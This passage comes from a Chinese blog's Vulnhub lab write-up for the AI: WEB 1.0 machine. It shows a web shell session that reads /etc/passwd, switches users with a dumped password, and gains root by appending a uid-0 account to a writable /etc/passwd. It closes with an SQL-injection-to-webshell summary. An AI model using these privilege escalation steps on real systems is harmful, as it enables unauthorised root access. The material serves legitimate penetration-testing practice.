+</span></span><span class=line><span class=cl>&lt;290o2sdf92213/se3reTdir777/uploads$ cat /etc/passwd                       
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lxd:x:105:65534::/var/lib/lxd/:/bin/false
+</span></span><span class=line><span class=cl>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>pollinate:x:109:1::/var/cache/pollinate:/bin/false
+</span></span><span class=line><span class=cl>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>aiweb1:x:1000:1000:AIWEB1:/home/aiweb1:/bin/bash
+</span></span><span class=line><span class=cl>mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>aiweb1pwn:x:1001:1001::/home/aiweb1pwn:/bin/sh
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ 
+</span></span></code></pre></td></tr></table></div></div><p>这是在shell中的一些信息收集</p><p>注意到有个aiweb1pwn 这是脱库遇到的内容，尝试切换用户</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ su aiweb1pwn
+</span></span><span class=line><span class=cl>&lt;443290o2sdf92213/se3reTdir777/uploads$ su aiweb1pwn                       
+</span></span><span class=line><span class=cl>Password: MyEvilPass_f908sdaf9_sadfasf0sa
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ whoami 
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>aiweb1pwn
+</span></span></code></pre></td></tr></table></div></div><p>切换成功，开始尝试提升到root</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> aiweb1pwn: MyEvilPass_f908sdaf9_sadfasf0sa
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Sorry, user aiweb1pwn may not run sudo on aiweb1.
+</span></span><span class=line><span class=cl>$ 
+</span></span></code></pre></td></tr></table></div></div><p>sudo提权失败，尝试suid</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find / -perm -4000 2&gt;/dev/null                                       
+</span></span><span class=line><span class=cl>find / -perm -4000 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/snap/core/7270/bin/mount                                     
+</span></span><span class=line><span class=cl>/snap/core/7270/bin/ping                                                
+</span></span><span class=line><span class=cl>/snap/core/7270/bin/ping6
+</span></span><span class=line><span class=cl>/snap/core/7270/bin/su                                         
+</span></span><span class=line><span class=cl>/snap/core/7270/bin/umount
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/bin/chfn
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/bin/chsh                                                
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/bin/passwd
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/bin/sudo
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>/snap/core/7270/usr/sbin/pppd
+</span></span><span class=line><span class=cl>/snap/core/7396/bin/mount
+</span></span><span class=line><span class=cl>/snap/core/7396/bin/ping
+</span></span><span class=line><span class=cl>/snap/core/7396/bin/ping6
+</span></span><span class=line><span class=cl>/snap/core/7396/bin/su
+</span></span><span class=line><span class=cl>/snap/core/7396/bin/umount
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/bin/chfn
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/bin/chsh
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/bin/passwd
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/bin/sudo
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>/snap/core/7396/usr/sbin/pppd
+</span></span><span class=line><span class=cl>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span class=line><span class=cl>/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/newuidmap
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/bin/newgidmap
+</span></span><span class=line><span class=cl>/usr/bin/pkexec
+</span></span><span class=line><span class=cl>/usr/bin/sudo
+</span></span><span class=line><span class=cl>/usr/bin/at
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/traceroute6.iputils
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/bin/su
+</span></span><span class=line><span class=cl>/bin/mount
+</span></span><span class=line><span class=cl>/bin/ping
+</span></span><span class=line><span class=cl>/bin/fusermount
+</span></span><span class=line><span class=cl>/bin/umount
+</span></span></code></pre></td></tr></table></div></div><p>检查过lxd提权，不行</p><p>切换账户aiweb1账户失败,查看他的home目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -la /home/aiweb1
+</span></span><span class=line><span class=cl>total 28
+</span></span><span class=line><span class=cl>drwxr-xr-x 4 aiweb1 aiweb1 4096 Aug 20  2019 .
+</span></span><span class=line><span class=cl>drwxr-xr-x 4 root   root   4096 Aug 20  2019 ..
+</span></span><span class=line><span class=cl>-rw------- 1 aiweb1 aiweb1    0 Aug 21  2019 .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 aiweb1 aiweb1  220 Apr  4  2018 .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 aiweb1 aiweb1 3771 Apr  4  2018 .bashrc
+</span></span><span class=line><span class=cl>drwx------ 2 aiweb1 aiweb1 4096 Aug 20  2019 .cache
+</span></span><span class=line><span class=cl>drwx------ 3 aiweb1 aiweb1 4096 Aug 20  2019 .gnupg
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root   root      0 Aug 21  2019 .mysql_history
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 aiweb1 aiweb1  807 Apr  4  2018 .profile
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 aiweb1 aiweb1    0 Aug 20  2019 .sudo_as_admin_successful
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root   root      0 Aug 21  2019 .viminfo
+</span></span><span class=line><span class=cl>$ 
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ls -l /etc/passwd
+</span></span><span class=line><span class=cl>ls -l /etc/passwd
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data www-data <span class=m>1664</span> Aug <span class=m>21</span>  <span class=m>2019</span> /etc/passwd
+</span></span></code></pre></td></tr></table></div></div><p>这时回头又发现，这个文件www-data有修改权限，先退出aiweb1pwn的账户，然后再构造一个uid=0的用户</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>exit</span>
+</span></span><span class=line><span class=cl><span class=nb>exit</span>
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ openssl passwd -1 -salt root password  
+</span></span><span class=line><span class=cl>&lt;r777/uploads$ openssl passwd -1 -salt root password                       
+</span></span><span class=line><span class=cl><span class=nv>$1$root$1</span>fvaXuILgb4rdRlHdQ80N/
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ <span class=nb>echo</span> <span class=s1>&#39;ke1th:$1$root$1fvaXuILgb4rdRlHdQ80N/:0:0:ke1th:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
+</span></span><span class=line><span class=cl>&lt;RlHdQ80N/:0:0:ke1th:/root:/bin/bash<span class=err>&#39;</span> &gt;&gt; /etc/passwd                       
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ tail /etc/passwd
+</span></span><span class=line><span class=cl>&lt;90o2sdf92213/se3reTdir777/uploads$ tail /etc/passwd                       
+</span></span><span class=line><span class=cl>lxd:x:105:65534::/var/lib/lxd/:/bin/false
+</span></span><span class=line><span class=cl>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>pollinate:x:109:1::/var/cache/pollinate:/bin/false
+</span></span><span class=line><span class=cl>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>aiweb1:x:1000:1000:AIWEB1:/home/aiweb1:/bin/bash
+</span></span><span class=line><span class=cl>mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>aiweb1pwn:x:1001:1001::/home/aiweb1pwn:/bin/sh
+</span></span><span class=line><span class=cl>ke1th:<span class=nv>$1$root$1</span>fvaXuILgb4rdRlHdQ80N/:0:0:ke1th:/root:/bin/bash
+</span></span><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$  
+</span></span></code></pre></td></tr></table></div></div><p>切换到新建的账户</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads$ su ke1th
+</span></span><span class=line><span class=cl>&lt;eb1x443290o2sdf92213/se3reTdir777/uploads$ su ke1th                       
+</span></span><span class=line><span class=cl>Password: password
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# id
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span><span class=line><span class=cl>root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# whoami
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>root
+</span></span><span class=line><span class=cl>root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# 
+</span></span></code></pre></td></tr></table></div></div><h2 id=拿到flag>拿到flag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# ls -la /root
+</span></span><span class=line><span class=cl>&lt;443290o2sdf92213/se3reTdir777/uploads# ls -la /root                   
+</span></span><span class=line><span class=cl>total <span class=m>40</span>
+</span></span><span class=line><span class=cl>drwx------  <span class=m>6</span> root root <span class=m>4096</span> Aug <span class=m>20</span>  <span class=m>2019</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>24</span> root root <span class=m>4096</span> Aug <span class=m>20</span>  <span class=m>2019</span> ..
+</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root  <span class=m>273</span> Aug <span class=m>21</span>  <span class=m>2019</span> .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root <span class=m>3106</span> Apr  <span class=m>9</span>  <span class=m>2018</span> .bashrc
+</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>20</span>  <span class=m>2019</span> .cache
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>709</span> Aug <span class=m>20</span>  <span class=m>2019</span> flag.txt
+</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root root <span class=m>4096</span> Aug <span class=m>20</span>  <span class=m>2019</span> .gnupg
+</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root    <span class=m>0</span> Aug <span class=m>21</span>  <span class=m>2019</span> .mysql_history
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>148</span> Aug <span class=m>17</span>  <span class=m>2015</span> .profile
+</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>20</span>  <span class=m>2019</span> .ssh
+</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root <span class=m>4096</span> Aug <span class=m>20</span>  <span class=m>2019</span> .vim
+</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root    <span class=m>0</span> Aug <span class=m>21</span>  <span class=m>2019</span> .viminfo
+</span></span><span class=line><span class=cl>root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# cat /root/flag.txt
+</span></span><span class=line><span class=cl>&lt;o2sdf92213/se3reTdir777/uploads# cat /root/flag.txt                   
+</span></span><span class=line><span class=cl><span class=c1>####################################################</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                AI: WEB 1.0                       #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#              Congratulation!!!                   #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#      Thank you for penetrate my system.          #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#            Hope you enjoyed this.                #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#  flag{cbe5831d864cbc2a104e2c2b9dfb50e5acbdee71}  #</span>
+</span></span><span class=line><span class=cl><span class=c1>#                                                  #</span>
+</span></span><span class=line><span class=cl><span class=c1>####################################################</span>
+</span></span><span class=line><span class=cl>root@aiweb1:/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads# 
+</span></span></code></pre></td></tr></table></div></div><h2 id=总结>总结</h2><p>信息收集Nmap扫描->robots.txt泄露隐藏目录->对泄露目录父目录爆破->获得一个info.php,一个无权限访问的上传路径，一个父目录的index-> info泄露php apache版本 web根目录->index是一个表单，burp抓包分析uid参数，确认sql注入类型->跑sqlmap进行脱库->确认数据库用户权限->结合根目录+上传路径写入webwell->RCE</p></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
